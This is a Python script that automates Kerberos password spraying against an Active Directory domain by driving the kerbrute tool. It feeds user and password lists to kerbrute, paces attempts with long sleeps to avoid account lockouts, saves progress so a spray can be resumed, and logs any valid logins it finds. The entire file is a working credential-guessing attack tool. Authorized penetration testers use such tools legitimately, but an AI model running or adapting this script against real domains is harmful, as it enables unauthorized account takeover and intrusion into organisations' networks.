import argparse
import os
import shutil
import subprocess
import sys
import time
import json
import re
from datetime import datetime, timedelta
import tempfile

CLEAR_LINE = "\033[2K\r"

# This script assumes you have kerbrute in /usr/local/bin/. It used kerbrute to spray a list of passwords, and wait a given amount of time in between each run.
# I made this script to make password spraying more efficient and safer. It saves the session state in a file, so if you need to stop the script, you can resume it later without losing progress. It also logs the output to a file for later review.

parser = argparse.ArgumentParser(description="Password sprayer using Kerbrute.",
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("--users", help="Path to username list.")
parser.add_argument("--passwords", help="Path to password list.")
parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in between password sprays.")
parser.add_argument("--domain", help="Domain name.")
parser.add_argument("--domain-ip", default="", help="Domain IP address.")
parser.add_argument("--pwd-line", type=int, default=0, help="Line number of password to resume from (0 = start)")
parser.add_argument("--user-line", type=int, default=0, help="Line number of user to resume from (0 = start)")
parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")
parser.add_argument("--session-file", default=".passwordspray_session", help="File to save session state for resuming.")
parser.add_argument("--log-file", default=".passwordspray.log", help="File to log output.")

args = parser.parse_args()

p = args.passwords
s = args.sleep
u = args.users
d = args.domain
ip = args.domain_ip
a = args.attempts
sf = args.session_file
lf = args.log_file
seconds = s*60
i = 0
j = args.pwd_line
k = args.user_line

kerbrute_path = shutil.which("kerbrute")
if not kerbrute_path or not os.access(kerbrute_path, os.X_OK):
    print("Kerbrute is not installed or executable. Install it from https://github.com/ropnop/kerbrute "
          "or update this script to call the program from a custom path.")
    sys.exit(1)

if os.path.exists(sf) and os.path.getsize(sf) >= 0:
    with open(sf, "r") as f:
        session = json.load(f)
        
        print("Resuming previous session:")
        print(f"  Users: {session['users']}")
        print(f"  Passwords: {session['passwords']}")
        print(f"  Sleep time (minutes): {session['sleep']}")
        print(f"  Domain: {session['domain']}")
        print(f"  Domain IP: {session['domain_ip']}")
        print(f"  Attempts before sleep: {session['attempts']}")
        print(f"  Current password line: {session['pwd_line']}")
        print(f"  Current user line: {session['user_line']}")
        print(f"  Last sprayed: {session['last_sprayed']}")
        
        while True:
            choice = input("Do you want to resume this session? (Y/n): ").lower()
            if choice in ["y", ""]:
                print("Resuming session...")
                break
            elif choice == "n":
                print(f"To start a new session, remove the session file: {sf}")
                sys.exit(0)
            else:
                print("Invalid input. Enter 'y' or 'n'.")
        
        p = session['passwords']
        s = session['sleep']
        u = session['users']
        d = session['domain']
        ip = session['domain_ip']
        a = session['attempts']
        j = session['pwd_line']
        k = session['user_line']
        sf = session['session_file']
        lf = session['log_file']
        seconds = s*60
        last_sprayed = datetime.strptime(session['last_sprayed'], "%Y-%m-%d %H:%M:%S")
        next_safe = last_sprayed + timedelta(minutes=s)
        now = datetime.now()
        
        if now < next_safe:
            remaining_time = int((next_safe - now).total_seconds())
            while remaining_time > 0:
                mins, secs = divmod(int(remaining_time), 60)
                time_format = f"{mins:02d}:{secs:02d}"
                print(f"\rTime remainin before spraying: {time_format}", end="", flush=True)
                time.sleep(1)
                remaining_time -= 1
else:
    if not all([p, u, d]):
        parser.print_help()
        sys.exit(1)

tu = None
if k > 0:
    with open(u) as f:
        lines = f.readlines()[k:]
    tu = tempfile.NamedTemporaryFile(delete=False, mode='w')
    tu.writelines(lines)
    tu.close()
    
    au = tu.name
else:
    au = u

with open(au) as f:
    total_users = sum(1 for _ in f)

with open (p) as passwords:
    for _ in range(j):
        passwords.readline()
    
    while True:
        password = passwords.readline()
        if not password:
            print("All passwords have been sprayed. Exiting...")
            break
        password = password.strip()
    
        try:
            if ip != "":
                process = subprocess.Popen(
                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, "--dc", ip, au, password],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            else:
                process = subprocess.Popen(
                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, au, password],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )

            curr_user = 0
            output_lines = []
            try:
                for line in process.stdout:
                    line = line.rstrip()
                    output_lines.append(line)

                    if "Invalid password" in line or "LOCKED OUT" in line or "not exist" in line:
                        curr_user += 1
                        print(f"\r[{curr_user}/{total_users}] {line}", end="", flush=True)
                    elif "VALID LOGIN" in line:
                        curr_user += 1
                        sys.stdout.write(CLEAR_LINE)
                        print(line)
                    else:
                        print(f"\n{line}")
                    sys.stdout.flush()
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                print(f"\nProcess interrupted by user. Resume with --pwd-line {j} and --user-line {curr_user}")
                
                with open(sf, "w") as f:
                    json.dump({
                        "users": u,
                        "passwords": p,
                        "sleep": s,
                        "domain": d,
                        "domain_ip": ip,
                        "attempts": a,
                        "pwd_line": j,
                        "user_line": curr_user,
                        "last_sprayed": (datetime.now() - timedelta(minutes=s+1)).strftime("%Y-%m-%d %H:%M:%S"),
                        "session_file": sf,
                        "log_file": lf
                    }, f, indent=4)
                
                with open(lf, "a") as log:
                    log.write(f"--- Password: {password} ---\n")
                    pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
                    filtered = [line for line in output_lines if pattern.search(line)]
                    log.write("\n".join(filtered) + "\n")
                    log.flush()

                sys.exit(0)
            finally:
                if tu and os.path.exists(tu.name):
                    os.remove(tu.name)
                k = 0
                au = u
                tu = None
                
                with open(au) as f:
                    total_users = sum(1 for _ in f)

            with open(lf, "a") as log:
                log.write(f"--- Password: {password} ---\n")
                pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
                filtered = [line for line in output_lines if pattern.search(line)]
                log.write("\n".join(filtered) + "\n")
                log.flush()

        except subprocess.CalledProcessError as e:
            print(e)
            
        print(f"[Processed: {j}] Sprayed password: {password}")
        sys.stdout.flush()
        
        i += 1
        j += 1
        
        with open(sf, "w") as f:
            json.dump({
                "users": u,
                "passwords": p,
                "sleep": s,
                "domain": d,
                "domain_ip": ip,
                "attempts": a,
                "pwd_line": j,
                "user_line": 0,
                "last_sprayed": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "session_file": sf,
                "log_file": lf
            }, f, indent=4)

        if i == a:
            i = 0
            print(f"Sleeping for {s} minute(s) after {a} attempt(s)...")
            print(f"Resume with --pwd-line {j} if interrupted")
            sys.stdout.flush()
            
            remaining_time = seconds
            while remaining_time > 0:
                mins, secs = divmod(remaining_time, 60)
                time_format = f"{mins:02d}:{secs:02d}"
                print(f"\rTime remaining: {time_format}", end="", flush=True)
                time.sleep(1)
                remaining_time -= 1
                
            print("\nResuming password spray...")
